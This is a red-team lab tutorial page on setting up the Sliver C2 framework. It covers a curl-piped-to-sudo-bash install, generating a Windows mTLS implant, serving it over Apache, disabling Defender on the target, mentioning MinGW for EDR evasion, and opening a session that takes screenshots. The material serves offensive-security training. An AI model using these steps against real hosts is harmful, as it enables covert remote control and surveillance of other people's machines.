---
title: 02-Installation
draft: false
tags:
  - sliver
  - c2
  - redteam
---
## Install Sliver

Installing Sliver is super simple. Just run the one-liner below:

```
curl https://sliver.sh/install|sudo bash
```

`systemctl start sliver` - Starts the Sliver instance.

`apt install git mingw-w64`- **MinGW** installation is optional but highly recommended since it is used for EDR evasion:

## Lab SetUp

Download and install WIndows 10 machine as a virtual machine.

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/Sliver/BuildSliverLab/01-vm-setup.png)

**Kali 2** will be our C2 Server and **Windows 10** will be our target.

```
+-------------------+                         +-------------------+
|                   |         Download binary |                   |
|     C2 Server     +--80 <-------------------+      Target       |
|      (Linux)      |                         |     (Windows)     |
|                   |         C2 Connection   |                   |
|   172.16.76.128   +--8888 <-----------------+   172.16.76.132   |
|                   |                         |                   |
+-------------------+                         +-------------------+
```

After completing Windows installation, go to **Virus & threat Protection Settings** and turn of all protection. We will research more on methods to bypass these protections without turning them off later.

## Create Sessions

Let's create a session by generating an implant and delivering to the target and executing it over there. 

### Generate Implant

We will use the following command:

```
generate --mtls 172.16.76.128 --os windows --arch amd64 --format exe --save /home/carabiner1/implants
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/Sliver/BuildSliverLab/01-implant-generate.png)

When moving the created implant to `/var/www/html`, make sure you set the right permission so that the target machine can access it through web server. Run `sudo chown www-data:www-data /var/www/html/COLD_INCIDENT.exe`

Now let's start the mTLS listener on the C2 Server:

```
sliver > mtls

[*] Starting mTLS listener ...

[*] Successfully started job #1

sliver > jobs

 ID   Name   Protocol   Port   Stage Profile 
==== ====== ========== ====== ===============
 1    mtls   tcp        8888     
```

We can verify that port 8888 is open and listening on the C2 Server. 

```
┌──(carabiner1㉿carabiner)-[~]
└─$ netstat -antop | grep 8888
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp6       0      0 :::8888                 :::*                    LISTEN      -                    off (0.00/0/0)
```
### Implant Delivery

We will deliver the implant using **Apache2 Web Server**.

On your C2 server, run `systemctl start apache2`.

Whatever file that goes to `/var/www/html` can now be accessed from the target Windows 10 machine. 

Going to `http://<C2 IP>/COLD_INCIDENT.exe`, we can download the implant.

When downloading, we will see such warning but ignore and just proceed.

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/Sliver/BuildSliverLab/01-warning.png)

### Session Created

Once we download and execute the implant, session should get established:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/Sliver/BuildSliverLab/session.png)

Using the command `sessions`, we can see list of sessions:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/Sliver/BuildSliverLab/01-sess.png)

### Use Session

We can choose a session to use through the command `use`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/Sliver/BuildSliverLab/01-use.png)

`info` command will show us more information on the implant:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/Sliver/BuildSliverLab/01-info.png)

We can now even take screenshots:

```
sliver (COLD_INCIDENT) > screenshot

[*] Screenshot written to /tmp/screenshot_DESKTOP-IPQVF9T_20220701224728_3343901839.png (893.2 KiB)
```

Once we are done using the session, we can background it using the command `background`.

When we are totally done with the session, we use `sessions -k <ID>` to remove the session:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/Sliver/BuildSliverLab/01-sess-k.png)

